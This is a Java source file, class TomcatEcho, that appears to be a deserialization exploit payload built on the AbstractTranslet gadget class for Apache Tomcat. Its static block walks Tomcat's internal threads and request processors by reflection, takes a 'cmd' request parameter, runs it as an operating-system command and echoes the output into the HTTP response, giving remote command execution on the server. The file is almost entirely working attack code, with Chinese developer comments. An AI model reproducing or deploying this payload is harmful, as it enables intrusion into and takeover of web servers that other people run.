import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;
import org.apache.coyote.Request;
import org.apache.coyote.RequestInfo;

import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.util.ArrayList;

// 这个类会超出tomcat header max size
// 需要将反射调用统一为函数
//public static Object getField(Object obj,String fieldName) throws Exception{
//        Field f0 = null;
//        Class clas = obj.getClass();
//
//        while (clas != Object.class){
//        try {
//        f0 = clas.getDeclaredField(fieldName);
//        break;
//        } catch (NoSuchFieldException e){
//        clas = clas.getSuperclass();
//        }
//        }
//
//        if (f0 != null){
//        f0.setAccessible(true);
//        return f0.get(obj);
//        }else {
//        throw new NoSuchFieldException(fieldName);
//        }
//}
public class TomcatEcho extends AbstractTranslet {
    static {
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field threadsField = ThreadGroup.class.getDeclaredField("threads");
            threadsField.setAccessible(true);
            Thread[] threads = (Thread[]) threadsField.get(threadGroup);
            for (Thread thread: threads) {
                if (thread == null) {
                    continue;
                }
                //          port
                // http-nio-9090-exec-3
                String threadName = thread.getName();
                // 不能含有 exec
                if (threadName.contains("exec")) {
                    continue;
                }
                // 必须含有 http
                if (!threadName.contains("http")) {
                    continue;
                }
                System.out.println(threadName);

                // NioEndpoint$Poller
                Field targetField = Thread.class.getDeclaredField("target");
                targetField.setAccessible(true);
                Object target = targetField.get(thread);

                // 需要单独处理 NioEndpoint$Poller.this$0.handler.global 如果找不到，则不能抛出异常，继续进行 for 循环寻找
                try {
                    // this$0  NioEndpoint
                    Field this$0Filed = Class.forName("org.apache.tomcat.util.net.NioEndpoint$Poller").getDeclaredField("this$0");
                    this$0Filed.setAccessible(true);
                    Object this$0 = this$0Filed.get(target);

                    // handler  AbstractProtocol$ConnectionHandler
                    Field handlerField = Class.forName("org.apache.tomcat.util.net.NioEndpoint").getDeclaredField("handler");
                    handlerField.setAccessible(true);
                    Object handler = handlerField.get(this$0);

                    // global  RequestGroupInfo
                    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    Object global = globalField.get(handler);

                    // processors  ArrayList<RequestInfo>
                    Field processorsField = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processorsField.setAccessible(true);
                    ArrayList<RequestInfo> processors = (ArrayList<RequestInfo>) processorsField.get(global);

                    for (RequestInfo requestInfo : processors) {
                        if (requestInfo != null) {
                            // req Request
                            Field reqField = Class.forName("org.apache.coyote.RequestInfo.req").getDeclaredField("req");
                            reqField.setAccessible(true);
                            Request req = (Request) reqField.get(requestInfo);

                            // request org.apache.catalina.connector.Request
                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
                            Response response = request.getResponse();

                            String cmd = null;
                            if (request.getParameter("cmd") == null){
                               continue;
                            }
                            cmd =  request.getParameter("cmd");
                            System.out.println(cmd);
                            InputStream inputStream = new ProcessBuilder(cmd).start().getInputStream();
                            StringBuilder sb = new StringBuilder("");
                            byte[] bytes = new byte[1024];
                            int n = 0 ;
                            while ((n=inputStream.read(bytes)) != -1){
                                sb.append(new String(bytes,0,n));
                            }

                            Writer writer = response.getWriter();
                            writer.write(sb.toString());
                            writer.flush();
                            inputStream.close();
                            System.out.println("success");
                            break;
                        }
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
